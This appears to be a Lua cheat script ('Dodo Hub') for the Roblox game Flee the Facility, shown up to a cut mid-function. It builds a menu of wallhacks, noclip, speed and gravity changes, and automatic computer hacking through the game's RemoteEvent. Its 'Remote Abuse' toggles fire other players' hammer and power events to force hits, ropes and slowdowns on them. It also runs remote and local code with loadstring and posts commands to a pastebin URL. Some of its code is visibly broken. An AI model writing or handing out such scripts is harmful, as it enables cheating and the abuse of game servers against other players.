-- fixin this part :3
-- compat fix
local env = (type(getgenv) == "function" and getgenv()) or _G

if env.DH_LOADED and not env.DH_DEBUG then
    warn("Script is already running")
    return
end
env.DH_LOADED = true

local Rayfield = loadstring(game:HttpGet("https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua"))()
local CurrentTheme = "DarkBlue"
if Rayfield and Rayfield.Flags and Rayfield.Flags["Theme"] then
    local savedTheme = Rayfield.Flags["Theme"].CurrentValue
    if typeof(savedTheme) == "table" and savedTheme[1] then
        CurrentTheme = savedTheme[1]
    end
end
local MarketplaceService = game:GetService("MarketplaceService")
local info = MarketplaceService:GetProductInfo(game.PlaceId)
local TweenService = game:GetService("TweenService")

local tips = {
    "Daffy734 im ur fan",
    "Daffy734 is him",
    "Respect for Daffy734",
    "Mad respect for Daffy734",
    "Daffy734 deserves all respect",
    "Daffy734 is god of scripts"
}
local function GetRandomTip()
    local index = math.random(1, #tips)
    return tips[index]
end
print("Working...")
task.wait(3)
if game.GameId ~= 372226183 then
    error("do not run what you just ran (vulnerable function)")
    error("'" .. script.Name .. "', Line 1")
    return
end
local y = game.Players.LocalPlayer
local x = game.Players.LocalPlayer.Name
local date = os.date("*t")
local month, day = date.month, date.day yyyy

local function GetEventEmoji()
    -- New Year 🎆 (January 1st to 4th)
    if month == 1 and (day == 1 or day == 2 or day == 3 or day == 4) then
        return "🎆"
    end

    -- Easter 🥚 (example April 20th to 24th, adjust every year)
    if month == 4 and (day == 20 or day == 21 or day == 23 or day == 24) then
        return "🥚"
    end

    -- Halloween 🎃 (October 31st to November 3rd)
    if (month == 10 and day == 31) or (month == 11 and (day == 1 or day == 2 or day == 3)) then
        return "🎃"
    end

    -- Christmas ❄️ (December 25th to 29th)
    if month == 12 and (day == 25 or day == 26 or day == 27 or day == 28 or day == 29) then
        return "❄️"
    end

    -- April Fools (April 1st to 5th)
    if month == 4 and (day == 1 or day == 2 or day == 3 or day == 4 or day == 5) then
        return "🤡"
    end

    -- Birthday 🎂 (August 31th to September 4th)
    if (month == 8 and (day == 31 or day == 31)) or (month == 9 and (day == 1 or day == 2 or day == 3 or day == 4)) then
        return "🎂"
    end

    -- default
    return "🔹"
end

local eventEmoji = GetEventEmoji()
task.wait(1)
print("Loaded: " .. script.Name .. " succeful. 💎 Join Dodo Hub to support us!💎")
print("gateway ID: " .. game.PlaceVersion)

local Window = Rayfield:CreateWindow({
   Name = "Dodo Development "..eventEmoji.." ["..info.Name.."]",
   Icon = 126271437555657,
   LoadingTitle = ">Loading...",
   LoadingSubtitle = GetRandomTip(),
   ShowText = "Dodo Hub",
   Theme = CurrentTheme,
   ToggleUIKeybind = "V",
   DisableRayfieldPrompts = true,
   DisableBuildWarnings = true,
   ConfigurationSaving = {
      Enabled = true,
      FolderName = "Dirsblox",
      FileName = "FTF_Config"
   },
   Discord = {
      Enabled = false,
      Invite = "https://discord.gg/zhDuFPRP",
      RememberJoins = true
   },
   KeySystem = false,
   KeySettings = {
      Title = "Dodo Hub",
      Subtitle = "Key system",
      Note = "NOTE: Get your key only once. After this, you will no longer need key anymore",
      FileName = "Key",
      SaveKey = true,
      GrabKeyFromSite = false,
      Key = {"Admin"}
   }
})

-- booting
--[[if not isfile("Dirsblox/Core/token") then
    error([[Unable to execute file: Workspace/Dirsblox/Core/Modules/Warnings.lua)
    error([[Unable to execute file: Workspace/Dirsblox/Core/Modules/Versions.lua)
    error([[FATAL_ERR: Can't find "Core")
    error("FATAL_ERR: Core&verx" .. math.random(10, 99) .. "@DIRSBLOX")
    task.wait(2)
    error("FATAL_ERR: Core&verx" .. math.random(10, 99) .. "@DIRSBLOX")
    task.wait(2)
    error("FATAL_ERR: Core&verx" .. math.random(10, 99) .. "@DIRSBLOX")
    task.wait(2)
    error("FATAL_ERR: Core&verx" .. math.random(10, 99) .. "@DIRSBLOX")
    task.wait(2)
    error("FATAL_ERR: Core&verx" .. math.random(10, 99) .. "@DIRSBLOX")
    warn("Stack overflow")
    return
end]]
local path = "Dirsblox/Core/System/Modules/WarnUserDiscordModule.lua"
if isfile(path) then
    loadstring(readfile(path))()
else
    warn("[DSBCore] File not found: " .. path)
end
local fav = true
local t1 = Window:CreateTab(" |  Basic Hacks", 113473998935078)
local t3 = Window:CreateTab(" |  ESP", 130937742838884)
local t4 = Window:CreateTab(" |  Exploit", 119319133251626)
local ta = Window:CreateTab(" |  Remote Control", 75183481782019)
local t5 = Window:CreateTab(" |  Misc", 100155648971622)
local t6 = Window:CreateTab(" |  Settings", 132834248211414)
local sectionSur = t4:CreateSection("⚪ Survivor ⚪")
local player = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local pasteURL = "https://pastebin.com/raw/LpxN1hgG"

local function sendCommand(command, target)
    local data = HttpService:JSONEncode({
        cmd = command,
        user = target or "All"
    })
    
    request({
        Url = pasteURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = data
    })
end
-- this doesnt work lol
local ad = readfile("Dirsblox/Core/token")
if ad == "64697273626c6f7820746f6b656e206170693a2062616e6964615f6f6666" then
    t6:CreateSection("Admin Modifications")
    local PlayerName = ""
    local Players = game:GetService("Players")
    
    local ButtonCheck = t6:CreateButton({
            Name = "Check For Users",
            Callback = function()
                sendCommand("Chat:Dodo Admin", "All")
            end,
    })
    
    local Input = t6:CreateInput({
            Name = "Username",
            CurrentValue = "",
            PlaceholderText = "Full username",
            RemoveTextAfterFocusLost = false,
            Flag = "UsernameInput",
            Callback = function(Text)
                PlayerName = Text
            end,
    })
    local ButtonKick = t6:CreateButton({
            Name = "Kick player",
            Callback = function()
                sendCommand("Kick", PlayerName)
            end,
    })
    local ButtonFreeze = t6:CreateButton({
            Name = "Freeze player",
            Callback = function()
                sendCommand("Freeze", PlayerName)
            end,
    })
    -- this dont work
end
local note = t1:CreateLabel("DISCLAIMER: If you get banned once, we cannot be responsible for this. Use the script with moderation.", 4483362458, Color3.fromRGB(30, 35, 40), false)
local Divider = t1:CreateDivider()
t6:CreateSection("Themes")
t6:CreateDropdown({
   Name = "Choose a custom Theme",
   Options = {"Amethyst","Bloom","AmberGlow","Serenity","Green"},
   CurrentOption = CurrentTheme,
   MultipleOptions = false,
   Flag = "Theme",
   Callback = function(Options)
        local chosenTheme = Options[1]
        if chosenTheme ~= CurrentTheme then
            _G.CustomTheme = chosenTheme
            Rayfield:SetTheme(chosenTheme)
            CurrentTheme = chosenTheme
        end
   end,
})
t6:CreateLabel("TIP: Configurations not loading? Click Reset Data to reset your configurations.", 95107582760295, Color3.fromRGB(30, 35, 40), true) -- Title, Icon, Color, IgnoreThems
t6:CreateButton({
   Name = "Reset Data",
   Callback = function()
        if isfile("Dirsblox/FTF_Config.rfld") then
            delfile("Dirsblox/FTF_Config.rfld")
            Rayfield:Notify({
                Title = "System Notification",
                Content = "Data has been resetted sucefully",
                Duration = 1.5,
                Image = 132834248211414,
            })
        else
            if not isfile("Dirsblox/FTF_Config.rfld") then
            Rayfield:Notify({
                Title = "System Notification",
                Content = "No data is avaible/configurations data is clear or nil.",
                Duration = 1.5,
                Image = 132834248211414,
            })
            end
        end
   end,
})
t6:CreateSection("Notifications")
t6:CreateToggle({
   Name = "Enable Server Notifications",
   CurrentValue = true,
   Flag = "ToggleNotificationSetting", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
        fav = Value
   end,
})
t6:CreateToggle({
   Name = "Enable Rayfield Notifications",
   CurrentValue = false,
   Flag = "ToggleRfldNotifications", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
        print("Rayfield notifications are turned off")
   end,
})

local function getCurrentCharacter()
    return player.Character
end
local function getCurrentHumanoid()
    local character = getCurrentCharacter()
    return character and character:FindFirstChildOfClass("Humanoid")
end
local function getCurrentRootPart()
    local character = getCurrentCharacter()
    return character and character:FindFirstChild("HumanoidRootPart")
end
-- ESP Toggles
local function getBeast() -- a important function (changing this mean your death)
    for _, plr in pairs(game.Players:GetPlayers()) do
        if plr and plr:FindFirstChild("TempPlayerStatsModule") then
            local stat = plr.TempPlayerStatsModule:FindFirstChild("IsBeast")
            if stat and stat.Value == true then
                return plr
            end
        end
    end
    return nil
end

local function updatePlayerESP()
    if not _G.PlayersESPEnabled then return end
    
    local playersList = game.Players:GetPlayers()
    for _, plr in pairs(playersList) do
        if plr ~= player and plr.Character then
            local char = plr.Character
            local highlight = char:FindFirstChild("Highlight")
            if not highlight then
                local a = Instance.new("Highlight", char)
                a.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                a.FillColor = Color3.fromRGB(0, 255, 0)
                a.OutlineColor = Color3.fromRGB(127, 255, 127)
                spawn(function()
                    repeat
                        wait(0.1)
                        if plr == getBeast() then
                            a.FillColor = Color3.fromRGB(255, 0, 0)
                            a.OutlineColor = Color3.fromRGB(255, 127, 127)
                        else
                            a.FillColor = Color3.fromRGB(0, 255, 0)
                            a.OutlineColor = Color3.fromRGB(127, 255, 127)
                        end
                    until not char or not a or not a.Parent
                end)
            end
        end
    end
end
-- do not change this bc it fucks the code
-- apply and remove Esp updated
local RS = game:GetService("ReplicatedStorage")
local CurrentMap = RS:WaitForChild("CurrentMap")

local function createESP(obj, fillColor, outlineColor)
    if not obj:FindFirstChild("ESP_Highlight") then
        local h = Instance.new("Highlight")
        h.Name = "ESP_Highlight"
        h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        h.FillColor = fillColor
        h.OutlineColor = outlineColor
        h.Parent = obj
    end
end

local function applyESP(objName, fillColor, outlineColor)
    if CurrentMap.Value then
        for _, obj in pairs(CurrentMap.Value:GetDescendants()) do
            if obj.Name == objName then
                createESP(obj, fillColor, outlineColor)
            end
        end
    end
end

local function removeESP(objName)
    if CurrentMap.Value then
        for _, obj in pairs(CurrentMap.Value:GetDescendants()) do
            if obj.Name == objName then
                local h = obj:FindFirstChild("ESP_Highlight")
                if h then h:Destroy() end
            end
        end
    end
end

local function onMapChanged()
    if _G.ESP_PODS then
        applyESP("FreezePod", Color3.fromRGB(0,255,255), Color3.fromRGB(127,255,255))
    else
        removeESP("FreezePod")
    end

    if _G.ESP_EXITS then
        applyESP("ExitDoor", Color3.fromRGB(255,255,0), Color3.fromRGB(255,127,127))
    else
        removeESP("ExitDoor")
    end
end
game.Players.PlayerAdded:Connect(function(plr)
    plr.CharacterAdded:Connect(updatePlayerESP)
end)
for _, plr in pairs(game.Players:GetPlayers()) do
    if plr.CharacterAdded then
        plr.CharacterAdded:Connect(updatePlayerESP)
    end
end
-- ================= ESP Fixed =================

-- ESP Players
t3:CreateToggle({
    Name = "Esp PLAYERS",
    CurrentValue = false,
    Flag = "TogglePlayersESP",
    Callback = function(Value)
        _G.PlayersESPEnabled = Value
        local playersList = game.Players:GetPlayers()
        for _, plr in pairs(playersList) do
            if plr ~= player and plr.Character then
                local char = plr.Character
                local highlight = char:FindFirstChild("Highlight")
                if highlight and not Value then
                    highlight:Destroy()
                end
                if Value and not highlight then
                    local a = Instance.new("Highlight", char)
                    a.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                    a.FillColor = Color3.fromRGB(0, 255, 0)
                    a.OutlineColor = Color3.fromRGB(127, 255, 127)
                    task.spawn(function()
                        while _G.PlayersESPEnabled and char and a and a.Parent do
                            task.wait(0.1)
                            if plr == getBeast() then
                                a.FillColor = Color3.fromRGB(255, 0, 0)
                                a.OutlineColor = Color3.fromRGB(255, 127, 127)
                            else
                                a.FillColor = Color3.fromRGB(0, 255, 0)
                                a.OutlineColor = Color3.fromRGB(127, 255, 127)
                            end
                        end
                        if a then a:Destroy() end
                    end)
                end
            end
        end
    end
})

-- ESP Pods

-- Toggles
t3:CreateToggle({
    Name = "ESP Pod",
    CurrentValue = false,
    Flag = "TogglePodsESP",
    Callback = function(Value)
        _G.ESP_PODS = Value
        if Value then
            task.spawn(function()
                while _G.ESP_PODS do
                    if CurrentMap.Value then
                        onMapChanged()
                    end
                    task.wait(1)
                end
            end)
        else
            removeESP("FreezePod")
        end
    end,
})

t3:CreateToggle({
    Name = "ESP Exit Doors",
    CurrentValue = false,
    Flag = "ToggleExitDoorsESP",
    Callback = function(Value)
        _G.ESP_EXITS = Value
        if Value then
            task.spawn(function()
                while _G.ESP_EXITS do
                    if CurrentMap.Value then
                        onMapChanged()
                    end
                    task.wait(1)
                end
            end)
        else
            removeESP("ExitDoor")
        end
    end,
})

-- ================= ESP PCs ATUALIZADO (RESET POR MAPA REAL) =================
local pcHighlights = {}
local mapVal = game.ReplicatedStorage:WaitForChild("CurrentMap")

local function clearAllPCs()
    for pc, hl in pairs(pcHighlights) do
        if hl then hl:Destroy() end
    end
    pcHighlights = {}
end

local function updatePCColor(pc, highlight)
    local screen = pc:FindFirstChild("Screen")
    if not screen or not screen:IsA("BasePart") then return end

    local color = screen.Color
    local r,g,b = math.floor(color.R*255), math.floor(color.G*255), math.floor(color.B*255)

    if r==40 and g==127 and b==71 then
        highlight.FillColor = Color3.fromRGB(40,127,71)
        highlight.OutlineColor = Color3.fromRGB(60,180,100)
    elseif r==13 and g==105 and b==172 then
        highlight.FillColor = Color3.fromRGB(13,105,172)
        highlight.OutlineColor = Color3.fromRGB(66,132,197)
    elseif r==196 and g==40 and b==28 then
        highlight.FillColor = Color3.fromRGB(196,40,28)
        highlight.OutlineColor = Color3.fromRGB(255,100,100)
    else
        highlight.FillColor = color
        highlight.OutlineColor = Color3.new(
            math.clamp(color.R + 0.3, 0, 1),
            math.clamp(color.G + 0.3, 0, 1),
            math.clamp(color.B + 0.3, 0, 1)
        )
    end
end

local function setupPC(pc)
    if not pc:IsA("Model") or pcHighlights[pc] then return end
    local screen = pc:FindFirstChild("Screen")
    if not screen or not screen:IsA("BasePart") then return end

    local highlight = Instance.new("Highlight")
    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    highlight.Parent = pc
    highlight.Enabled = _G.ESP_PCS or false

    pcHighlights[pc] = highlight
    updatePCColor(pc, highlight)

    screen:GetPropertyChangedSignal("Color"):Connect(function()
        if _G.ESP_PCS and highlight then
            updatePCColor(pc, highlight)
        end
    end)
end

local function setupAllPCsForMap(mapModel)
    clearAllPCs()
    if not _G.ESP_PCS or not mapModel then return end

    -- procurar PCs apenas dentro do mapa
    for _, obj in pairs(mapModel:GetDescendants()) do
        if obj.Name == "ComputerTable" then
            setupPC(obj)
        end
    end
end

-- toggle ESP
t3:CreateToggle({
    Name = "ESP PCs",
    CurrentValue = false,
    Flag = "TogglePCsESP",
    Callback = function(Value)
        _G.ESP_PCS = Value
        if Value then
            task.spawn(function()
                while _G.ESP_PCS do
                    if mapVal.Value then
                        task.wait(2)
                        setupAllPCsForMap(mapVal.Value)
                    else
                        clearAllPCs()
                    end
                    task.wait(5)
                end
            end)
        else
            clearAllPCs()
        end
    end,
})

-- reset automático quando o mapa muda
mapVal:GetPropertyChangedSignal("Value"):Connect(function()
    clearAllPCs()
    if _G.ESP_PCS and mapVal.Value then
        task.delay(2, function() -- esperar PCs carregarem
            setupAllPCsForMap(mapVal.Value)
        end)
    end
end)
-- Basic Hacks buttons
local noclip = false
local sectionNoclip = t1:CreateSection("Noclip/Inf jump")
t1:CreateToggle({
    Name = "Noclip",
    CurrentValue = false,
    Flag = "ToggleNoclip",
    Callback = function(Value)
        noclip = Value
    end,
})
t1:CreateToggle({
    Name = "Infinite Jump (UNSTABLE)",
    CurrentValue = false,
    Flag = "ToggleIJ",
    Callback = function(Value)
        local InfiniteJumpEnabled = Value
        game:GetService("UserInputService").JumpRequest:Connect(function()
            if InfiniteJumpEnabled then
                local humanoid = getCurrentHumanoid()
                if humanoid then
                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                end
            end
        end)
    end,
})
-- simon do not touch
game:GetService("RunService").Stepped:Connect(function()
    if noclip then
        local char = getCurrentCharacter()
        if char then
            for _, part in pairs(char:GetDescendants()) do
                if part:IsA("BasePart") and part.CanCollide then
                    part.CanCollide = false
                end
            end
        end
    end
end)
local CurrentValueWS = 16
local CurrentValueJP = 50
local CurrentValueGR = 198.6
local sectionWalkSpeed = t1:CreateSection("Walk speed")
local ws = t1:CreateSlider({
    Name = "WalkSpeed",
    Range = {0, 50},
    Increment = 1,
    Suffix = "WalkSpeed",
    CurrentValue = CurrentValueWS,
    Flag = "SliderWalkSpeed",
    Callback = function(Value)
        local humanoid = getCurrentHumanoid()
        if humanoid then
            humanoid.WalkSpeed = Value
        end
    end,
})
local sectionJumpPower = t1:CreateSection("Jump power")
local jp = t1:CreateSlider({
    Name = "JumpPower",
    Range = {0, 100},
    Increment = 1,
    Suffix = "JumpPower",
    CurrentValue = CurrentValueJP,
    Flag = "SliderJumpPower",
    Callback = function(Value)
        local humanoid = getCurrentHumanoid()
        if humanoid then
            humanoid.JumpPower = Value
        end
    end,
})
local sectionGravity = t1:CreateSection("World gravity")
local tub = t1:CreateSlider({
    Name = "Gravity",
    Range = {0, 500},
    Increment = 10,
    Suffix = "Gravity",
    CurrentValue = CurrentValueGR,
    Flag = "SliderGravity",
    Callback = function(Value)
        workspace.Gravity = Value
    end,
})
t1:CreateSection("Reset changes")
t1:CreateButton({
    Name = "Reset Gravity",
    Callback = function()
        CurrentValueGR = 198.6
        workspace.Gravity = CurrentValueGR
        tub:Set(198.6) -- The new slider integer value
    end,
})
t1:CreateButton({
    Name = "Reset Speed",
    Callback = function()
        local humanoid = getCurrentHumanoid()
        if humanoid then
            CurrentValueWS = 16
            humanoid.WalkSpeed = CurrentValueWS
            ws:Set(16) -- The new slider integer value
        end
    end,
})
t1:CreateButton({
    Name = "Reset JP",
    Callback = function()
        local humanoid = getCurrentHumanoid()
        if humanoid then
            CurrentValueJP = 50
            humanoid.JumpPower = CurrentValueJP
            jp:Set(50) -- The new slider integer value
        end
    end,
})

local function applyCharacterSettings()
    local humanoid = getCurrentHumanoid()
    if humanoid then
        if CurrentValueWS ~= 16 then
            humanoid.WalkSpeed = CurrentValueWS
        end
        if CurrentValueJP ~= 50 then
            humanoid.JumpPower = CurrentValueJP
        end
    end
end

player.CharacterAdded:Connect(function(newCharacter)
    local humanoid = newCharacter:WaitForChild("Humanoid")
    task.wait(0.1)
    applyCharacterSettings()
end)
-- FTF Exploits
t4:CreateButton({
    Name = "Confuse Beast",
    Callback = function()
        local targetCFrame = CFrame.new(111.204, 8.207, -413.459)
        local character = getCurrentCharacter()
        if character and character.PrimaryPart then
            for i = 1, 240 do
                character:SetPrimaryPartCFrame(targetCFrame)
                task.wait(0.05)
            end
        end
    end,
})
t4:CreateButton({
    Name = "Unfreeze",
    Callback = function()
        Rayfield:Notify({
            Title = "Alert",
            Content = "You can no longer hack computers, but you can still escape.",
            Duration = 2,
            Image = "rewind",
        })
        local character = getCurrentCharacter()
        if character then
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.Health = 0
            end
        end
    end,
})
t4:CreateButton({
    Name = "Anti PC Error",
    Callback = function()
        _G.AutomaticHackingEnabled = not _G.AutomaticHackingEnabled
        Rayfield:Notify({
            Title = "AntiPCError",
            Content = _G.AutomaticHackingEnabled and "🟩 ENABLED" or "🟥 DISABLED",
            Duration = 2,
            Image = 4483362458,
        })
        if _G.AutomaticHackingEnabled then
            spawn(function()
                while _G.AutomaticHackingEnabled do
                    local args = {
                        "SetPlayerMinigameResult",
                        true
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):FireServer(unpack(args))
                    task.wait()
                end
            end)
        end
    end,
})
ta:CreateSection("Survivor - NEW")
-- interact
ta:CreateToggle({
    Name = "Auto Interact",
    CurrentValue = false,
    Flag = "ToggleInputAction",
    Callback = function(Value)
        _G.InputActionEnabled = Value
        if Value then
            task.spawn(function()
                while _G.InputActionEnabled do
                    local args = {
                        "Input",
                        "Action",
                        true
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):FireServer(unpack(args))
                    task.wait()
                end
            end)
        end
    end,
})
--
-- Lista de triggers do jogo
local TriggerNames = {
    "DoorTrigger",
    "ExitDoorTrigger",
    "PodTrigger",
    "ComputerTrigger1",
    "ComputerTrigger2",
    "ComputerTrigger3",
}

-- Tabelas globais
local ActiveTouches = {}
_G.SelectedInstances = {}

-- Função para verificar se o trigger está permitido
local function IsTriggerAllowed(triggerName)
    if #(_G.SelectedInstances or {}) == 0 then
        return true -- Se nada for escolhido, libera todos
    end
    for _, v in ipairs(_G.SelectedInstances) do
        if v == triggerName then
            return true
        end
    end
    return false
end

ta:CreateDropdown({
    Name = "Choose a Trigger",
    Options = TriggerNames,
    CurrentOption = {},
    MultipleOptions = true,
    Flag = "Dropdown_AutoInteract",
    Callback = function(Options)
        _G.SelectedInstances = Options
    end,
})

-- Função para configurar triggers
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function SetupTrigger(trigger)
    if trigger:IsA("BasePart") then
        trigger.Touched:Connect(function(hit)
            if hit.Parent == LocalPlayer.Character then
                ActiveTouches[trigger] = true
            end
        end)
        trigger.TouchEnded:Connect(function(hit)
            if hit.Parent == LocalPlayer.Character then
                ActiveTouches[trigger] = nil
            end
        end)
    end
end

-- Configurar triggers existentes
for _, name in ipairs(TriggerNames) do
    local obj = workspace:FindFirstChild(name, true) -- busca em descendentes
    if obj then
        SetupTrigger(obj)
    end
end
--
-- hit sverin
local plyers = game:GetService("Players")
local HENTAI = false
local JOT = 60

local function GetClis(maxDist)
    local beast = getBeast()
    if not beast or not beast.Character or not beast.Character:FindFirstChild("HumanoidRootPart") then return nil end

    local beastPos = beast.Character.HumanoidRootPart.Position
    local closest, closestDist

    for _, plr in pairs(plyers:GetPlayers()) do
        if plr ~= beast and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            local dist = (plr.Character.HumanoidRootPart.Position - beastPos).Magnitude
            if dist <= maxDist and (not closestDist or dist < closestDist) then
                closest = plr
                closestDist = dist
            end
        end
    end

    return closest
end

task.spawn(function()
    while true do
        if HENTAI then
            local beast = getBeast()
            if beast and beast.Character then
                local hammer = beast.Character:FindFirstChild("Hammer")
                local hammerEvent = hammer and hammer:FindFirstChild("HammerEvent")
                local victim = getClosestVictimToBeast(FORCE_HIT_DISTANCE)

                if hammerEvent and victim and victim.Character then
                    local torso = victim.Character:FindFirstChild("Torso") or victim.Character:FindFirstChild("UpperTorso")
                    if torso then
                        hammerEvent:FireServer("HammerHit", torso)
                        print("Beast hit used on "..victim.Name)
                    end
                end
            end
        end
        task.wait(0.1)
    end
end)
-- give hit
local forceBeastHitEnabled = false
local FORCE_HIT_DISTANCE = 16

local function getClosestVictimToBeast(maxDist)
    local beast = getBeast()
    if not beast or not beast.Character or not beast.Character:FindFirstChild("HumanoidRootPart") then return nil end

    local beastPos = beast.Character.HumanoidRootPart.Position
    local closest, closestDist

    for _, plr in pairs(plyers:GetPlayers()) do
        if plr ~= beast and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            local dist = (plr.Character.HumanoidRootPart.Position - beastPos).Magnitude
            if dist <= maxDist and (not closestDist or dist < closestDist) then
                closest = plr
                closestDist = dist
            end
        end
    end

    return closest
end

task.spawn(function()
    while true do
        if forceBeastHitEnabled then
            local beast = getBeast()
            if beast and beast.Character then
                local hammer = beast.Character:FindFirstChild("Hammer")
                local hammerEvent = hammer and hammer:FindFirstChild("HammerEvent")
                local victim = getClosestVictimToBeast(FORCE_HIT_DISTANCE)

                if hammerEvent and victim and victim.Character then
                    local torso = victim.Character:FindFirstChild("Torso") or victim.Character:FindFirstChild("UpperTorso")
                    if torso then
                        hammerEvent:FireServer("HammerHit", torso)
                        print("Beast hit used on "..victim.Name)
                    end
                end
            end
        end
        task.wait(0.1)
    end
end)

-- give rope
local plyers = game:GetService("Players")
local LocalPlayer = plyers.LocalPlayer
local autoRopeBeastEnabled = false
local AUTO_ROPE_BEAST_DISTANCE = 32

local function GetBeastPlayer()
    for _, plr in pairs(plyers:GetPlayers()) do
        if plr ~= LocalPlayer and plr:FindFirstChild("TempPlayerStatsModule") then
            local stat = plr.TempPlayerStatsModule:FindFirstChild("IsBeast")
            if stat and stat.Value == true then
                return plr
            end
        end
    end
    return nil
end

local function RopeBeast(beast)
    if not beast or not beast.Character then return end
    local torso = beast.Character:FindFirstChild("Torso") or beast.Character:FindFirstChild("UpperTorso")
    local hrp = beast.Character:FindFirstChild("HumanoidRootPart")
    if torso and hrp then
        local char = LocalPlayer.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            local dist = (hrp.Position - char.HumanoidRootPart.Position).Magnitude
            if dist <= AUTO_ROPE_BEAST_DISTANCE then
                local hammer = char:FindFirstChild("Hammer")
                if hammer then
                    local HammerEvent = hammer:FindFirstChild("HammerEvent")
                    if HammerEvent then
                        HammerEvent:FireServer("HammerTieUp", torso, hrp.Position)
                        print("[Auto Rope Beast] usado em:", beast.Name)
                    end
                end
            end
        end
    end
end

task.spawn(function()
    while true do
        if autoRopeBeastEnabled then
            local beast = GetBeastPlayer()
            if beast then
                RopeBeast(beast)
            end
        end
        task.wait(0.2)
    end
end)

ta:CreateSection("Remote Abuse - Troll")
ta:CreateToggle({
    Name = "Hit Everyone",
    CurrentValue = false,
    Flag = "ToggleAutoRopeBeast",
    Callback = function(Value)
        HENTAI = Value
    end,
})
ta:CreateToggle({
    Name = "Give Auto Rope",
    CurrentValue = false,
    Flag = "ToggleAutoRopeBeast",
    Callback = function(Value)
        autoRopeBeastEnabled = Value
    end,
})

ta:CreateToggle({
    Name = "Give Auto Hit",
    CurrentValue = false,
    Flag = "ToggleForceBeastHitAura",
    Callback = function(Value)
        forceBeastHitEnabled = Value
        if forceBeastHitEnabled then
            print("[SYSTEM] Activated (range "..FORCE_HIT_DISTANCE.." studs)")
        else
            -- luna is so gyatt
        end
    end,
})

ta:CreateSection("Remote Abuse")
--slowmo best
ta:CreateToggle({
    Name = "Slow beast",
    CurrentValue = false,
    Flag = "ToggleSlowBeast",
    Callback = function(Value)
        _G.SlowBeastEnabled = Value
        if Value then
            task.spawn(function()
                while _G.SlowBeastEnabled do
                    for _, plr in pairs(game.Players:GetChildren()) do
                        if plr.Character and plr == getBeast() then
                            local stats = plr:FindFirstChild("TempPlayerStatsModule")
                            if stats and plr.Character:FindFirstChild("BeastPowers") then
                                local powers = plr.Character.BeastPowers
                                if powers:FindFirstChild("PowersEvent") then
                                    powers.PowersEvent:FireServer("Jumped")
                                end
                            end
                        end
                    end
                    task.wait() -- return
                end
            end)
        end
    end,
})
-- remove rope
ta:CreateToggle({
    Name = "Auto Remove Rope",
    CurrentValue = false,
    Flag = "ToggleHammerClick",
    Callback = function(Value)
        _G.HammerClickEnabled = Value
        if Value then
            task.spawn(function()
                while _G.HammerClickEnabled do
                    local beast = getBeast()
                    if beast and beast.Character then
                        local hammer = beast.Character:FindFirstChild("Hammer")
                        if hammer then
                            local hammerEvent = hammer:FindFirstChild("HammerEvent")
                            if hammerEvent then
                                hammerEvent:FireServer("HammerClick", true)
                            end
                        end
                    end
                    task.wait()
                end
            end)
        end
    end,
})

t4:CreateSection("🔴 Beast 🔴")
-- auto rope
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local AUTO_ROPE_DISTANCE = 32
local autoRopeEnabled = false
local character
local hammer
local HammerEvent
local isBeast = false

local function SetupHammer()
    character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    if isBeast and character then
        hammer = character:WaitForChild("Hammer", 5)
        if hammer then
            HammerEvent = hammer:WaitForChild("HammerEvent", 5)
            print("Hammer and HammerEvent set up!")
        end
    end
end
-- luna is so gyatttt
local function TryAutoRope(victim)
    if not victim.Character then return end
    local victimStats = victim:FindFirstChild("TempPlayerStatsModule")
    if not victimStats then return end
    local ragdoll = victimStats:FindFirstChild("Ragdoll")
    local health = victimStats:FindFirstChild("Health")

    if ragdoll and ragdoll.Value == true and health and health.Value > 0 then
        local torso = victim.Character:FindFirstChild("Torso") or victim.Character:FindFirstChild("UpperTorso")
        local hrp = victim.Character:FindFirstChild("HumanoidRootPart")
        if torso and hrp and HammerEvent then
            HammerEvent:FireServer("HammerTieUp", torso, hrp.Position)
            print("Used on:", victim.Name)
        end
    end
end

-- Auto Rope loop
task.spawn(function()
    while true do
        if autoRopeEnabled and isBeast then
            if not character or not character.Parent then
                SetupHammer()
            end

            local beastRoot = character and character:FindFirstChild("HumanoidRootPart")
            if beastRoot and HammerEvent then
                for _, player in pairs(Players:GetPlayers()) do
                    if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        local dist = (player.Character.HumanoidRootPart.Position - beastRoot.Position).Magnitude
                        if dist <= AUTO_ROPE_DISTANCE then
                            TryAutoRope(player)
                        end
                    end
                end
            end
        end
        task.wait(0.1)
    end
end)

-- Update beast status
local function UpdateBeastStatus()
    local stats = LocalPlayer:FindFirstChild("TempPlayerStatsModule")
    if stats then
        local beastVal = stats:FindFirstChild("IsBeast")
        if beastVal then
            isBeast = beastVal.Value
            if isBeast then
                SetupHammer()
            else
                hammer = nil
                HammerEvent = nil
            end

            beastVal:GetPropertyChangedSignal("Value"):Connect(function()
                isBeast = beastVal.Value
                if isBeast then
                    LocalPlayer.CharacterAdded:Wait()
                    task.wait(0.5)
                    SetupHammer()

                    if autoRopeEnabled then
                        print("[Auto Rope] Reactivated when becoming Beast!")
                    end
                else
                    hammer = nil
                    HammerEvent = nil
                end
            end)
        end
    end
end

UpdateBeastStatus()

-- Toggle: Hit Aura (Auto Hammer Hit)
local HIT_AURA_DISTANCE = 32
local hitAuraEnabled = false

local function GetClosPlr(maxDist)
    local closest, closestDist
    local myChar = LocalPlayer.Character
